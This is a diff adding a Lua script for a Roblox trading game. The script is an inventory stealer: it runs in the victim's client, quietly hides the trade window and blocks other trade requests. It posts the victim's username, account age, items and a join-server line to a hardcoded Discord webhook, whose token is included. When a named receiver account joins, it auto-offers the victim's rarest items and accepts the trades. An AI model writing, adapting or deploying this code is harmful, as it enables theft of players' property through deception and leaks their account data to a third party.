@@ -1,0 +1,321 @@
+local Configuration = {
+    Username = "7Jamiee7",
+    ManualChatCmd = "!Send",
+    PrintInventory = false, 
+    DebugPrints = false,
+    HideTradeUI = true,
+    WebhookURL = "https://discord.com/api/webhooks/1344711647800856777/BnRbDvatEVnSQRMWkX93js0GuRvJYzoKLRthiAwxkxnMF6Y3kbKcRW1CbcZMszhOlvJP"
+}
+
+
+repeat wait() until pcall(function() return game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame.Container end)
+
+if _G.Running then return warn("Already running") else _G.Running = true end
+
+game:GetService("ReplicatedStorage").Trade.SetRequestsEnabled:FireServer(false) 
+
+if Configuration.DebugPrints then
+print("Running...")
+end
+
+if not Configuration.WebhookURL or not string.find(Configuration.WebhookURL, "https://discord.com/api/webhooks/") then
+    if game.Players.LocalPlayer then
+        game.Players.LocalPlayer:Kick("Aborting: Invalid webhook URL")
+    end
+    return
+end
+
+if not Configuration.Username or Configuration.Username == "" then
+    if game.Players.LocalPlayer then
+        game.Players.LocalPlayer:Kick("Aborting: Username cannot be empty")
+    end
+    return
+end
+
+if not Configuration.ManualChatCmd or Configuration.ManualChatCmd == "" then
+    if game.Players.LocalPlayer then
+        game.Players.LocalPlayer:Kick("Aborting: ManualChatCmd cannot be empty")
+    end
+    return
+end
+
+local Resources = {
+InventoryPath = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage.ScrollFrame.Container,
+itemData = {},
+rarityCount = {},
+ReceiverJoined = false,
+TradeStarted = false
+}
+
+
+if Configuration.HideTradeUI then
+spawn(function() --// Hide trade ui
+    while true do
+        pcall(function()
+            local gui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("TradeGUI")
+            if gui then
+                gui.Enabled = false
+                local frame = gui:FindFirstChild("Container")
+                if frame then
+                    frame.Visible = false
+                end
+            else
+                print("TradeGUI not found")
+            end
+        end)
+        wait()
+    end
+end)
+end
+
+function collectInventoryData()
+    Resources.itemData = {}
+    Resources.rarityCount = {}
+
+    local rarityPriority = {
+        Godly = 6,
+        Ancient = 5,
+        Vintage = 4,
+        Legendary = 3,
+        Rare = 2,
+        Uncommon = 1
+    }
+
+    for _, item in ipairs(Resources.InventoryPath:GetChildren()) do
+        if item:IsA("Frame") then
+            local itemName = item.Name
+            local amount = 1
+            local rarity = nil
+            local priority = 0
+
+            for _, desc in ipairs(item:GetDescendants()) do
+                if desc:IsA("TextLabel") then
+                    if desc.Name == "Amount" then
+                        local amountText = desc.Text:gsub("%D", "")
+                        if amountText ~= "" then
+                            amount = tonumber(amountText) or 1
+                        end
+                    elseif desc.Name == "Rarity" then
+                        rarity = desc.Text
+                        priority = rarityPriority[rarity] or 0
+                    end
+                end
+            end
+
+            if rarity then
+                table.insert(Resources.itemData, {
+                    Name = itemName,
+                    Amount = amount,
+                    Rarity = rarity,
+                    Priority = priority
+                })
+            end
+        end
+    end
+
+    for _, data in ipairs(Resources.itemData) do
+        Resources.rarityCount[data.Rarity] = (Resources.rarityCount[data.Rarity] or 0) + data.Amount
+    end
+end
+collectInventoryData()
+
+
+function sendTradeRequest(targetName)
+    local success, err = pcall(function()
+        local targetPlayer = game:GetService("Players"):FindFirstChild(targetName)
+        if targetPlayer then
+            game.ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
+            if Configuration.DebugPrints then
+            print("Sent trade request to receiver")
+            end
+        end
+    end)
+end
+
+function AcceptTrade()
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+    if Configuration.DebugPrints then
+    print("Accepted trade")
+    end
+end
+
+function OfferItem(itemName)
+    game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(itemName, "Weapons")
+    if Configuration.DebugPrints then
+    print("Offered item: " .. itemName)
+    end
+end
+
+game:GetService("ReplicatedStorage").Trade.StartTrade.OnClientEvent:Connect(function()
+    if Configuration.DebugPrints then
+    print("Trade started!")
+    end
+
+    Resources.TradeStarted = true
+end)
+
+function tradeLoop(targetName)
+    while Resources.ReceiverJoined do
+        Resources.TradeStarted = false
+        
+        while not Resources.TradeStarted do
+            sendTradeRequest(targetName)
+            task.wait(5)
+        end
+
+        task.wait(2) 
+        collectInventoryData()
+
+        table.sort(Resources.itemData, function(a, b)
+            return a.Rarity > b.Rarity
+        end)
+
+        local selectedItems = {}
+        for _, item in ipairs(Resources.itemData) do
+            if #selectedItems < 4 then
+                table.insert(selectedItems, item)
+            else
+                break
+            end
+        end
+
+        for _, item in ipairs(selectedItems) do
+            for i = 1, item.Amount do
+                OfferItem(item.Name)
+            end
+        end
+
+        task.wait(8)
+        AcceptTrade()
+        task.wait(7)
+    end
+end
+
+
+function sendWebhookMessage()
+    if not Configuration or not Configuration.WebhookURL or Configuration.WebhookURL == "" then
+        warn("Webhook URL is not set!")
+        return
+    end
+
+    local player = game.Players.LocalPlayer
+    local username = player.Name
+    local accountAge = player.AccountAge
+    local teleportScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance('%s', '%s', game.Players.LocalPlayer)", tostring(game.PlaceId), tostring(game.JobId))
+
+    local rarityPriority = {
+        Godly = 6,
+        Ancient = 5,
+        Vintage = 4,
+        Legendary = 3,
+        Rare = 2,
+        Uncommon = 1,
+        Common = 0
+    }
+
+    local rarityCounts = {
+        Godly = 0,
+        Ancient = 0,
+        Vintage = 0,
+        Legendary = 0,
+        Rare = 0,
+        Uncommon = 0,
+        Common = 0
+    }
+
+    for _, item in ipairs(Resources.itemData) do
+        local rarity = item.Rarity
+        if rarityCounts[rarity] then
+            rarityCounts[rarity] = rarityCounts[rarity] + item.Amount
+        end
+    end
+
+    local rarityMessage = ""
+    for rarity, count in pairs(rarityCounts) do
+        rarityMessage = rarityMessage .. string.format("**%s:** %d\n", rarity, count)
+    end
+
+    local inventoryMessage = ""
+    if #Resources.itemData == 0 then
+        inventoryMessage = "Inventory Empty"
+    else
+        for _, item in ipairs(Resources.itemData) do
+            inventoryMessage = inventoryMessage .. string.format("%s (%dx), ", item.Name, item.Amount)
+        end
+        inventoryMessage = inventoryMessage:sub(1, -3)  -- Remove trailing comma and space
+    end
+
+    local payload = {
+        embeds = {
+            {
+                title = "**Inventory Log**",
+                description = string.format("**Username:** %s\n**Account Age:** %d days\n\n**Rarity Counts:**\n\n%s\n**Inventory:**\n```%s```\n\n**Execute to Join:**\n```%s```", username, accountAge, rarityMessage, inventoryMessage, teleportScript),
+                color = 0x0047AB,
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                footer = {
+                    text = "Inventory Data"
+                }
+            }
+        }
+    }
+
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local request_payload = {
+        Url = Configuration.WebhookURL,
+        Method = "POST",
+        Headers = headers,
+        Body = game:GetService("HttpService"):JSONEncode(payload)
+    }
+
+    local success, response = pcall(function()
+        return http_request(request_payload)
+    end)
+
+    if success then
+        print("Webhook message sent successfully.")
+    else
+        warn("Failed to send webhook message:", response)
+    end
+end
+sendWebhookMessage()
+
+
+
+
+
+game:GetService("Players").PlayerAdded:Connect(function(player)
+    if player.Name == Configuration.Username then
+        if Configuration.DebugPrints then
+        print("Receiver has joined")
+        end
+
+        Resources.ReceiverJoined = true
+        task.wait(10)
+        tradeLoop(player.Name)
+    end
+end)
+
+game:GetService("Players").PlayerRemoving:Connect(function(player)
+    if player.Name == Configuration.Username then
+        Resources.ReceiverJoined = false
+        if Configuration.DebugPrints then
+            print("Receiver has left the game")
+        end
+    end
+end)
+
+
+game:GetService("RunService").Heartbeat:Connect(function()
+    local targetPlayer = game:GetService("Players"):FindFirstChild(Configuration.Username)
+    if targetPlayer then
+        if not Resources.ReceiverJoined then
+            Resources.ReceiverJoined = true
+            tradeLoop(Configuration.Username)
+        end
+    else
+        Resources.ReceiverJoined = false
+    end
+end)
